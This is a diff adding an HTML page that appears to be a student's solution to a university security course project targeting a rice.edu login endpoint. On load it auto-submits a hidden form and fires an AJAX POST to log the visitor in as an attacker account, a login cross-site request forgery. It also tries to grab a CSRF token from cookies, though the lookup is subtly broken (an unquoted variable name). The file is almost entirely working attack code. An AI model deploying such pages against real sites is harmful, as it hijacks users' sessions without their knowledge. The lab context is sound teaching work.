@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>csrf1</title>
+</head>
+<body onload="document.csrf1Form.submit()">
+    
+    <form action="https://comp427.rice.edu/proj2/login?csrfdefense=0&xssdefense=4" method="POST" target="hiddenFrame" name="csrf1Form">
+        <input id="username" name="username" type="hidden" value="attacker" required="">
+        <input id="userpass" name="password" type="hidden" value="3l33thax0rz!" required="">
+        <script>
+        function getCookie(name) { // reference "https://stackoverflow.com/questions/10730362/get-cookie-by-name?page=1&tab=scoredesc#tab-top"
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+          }</script>
+        
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+        <script> $.ajax({ url: 'https://comp427a.rice.edu/proj2/login?csrfdefense=1&xssdefense=0', method: 'POST', data: { username: 'attacker', password: '3l33thax0rz!', csrf_token: getCookie(csrf_token) } }); </script>
+
+
+    </form>
+    <iframe name="hiddenFrame" style="display: none;"></iframe>
+</body>
+</html>
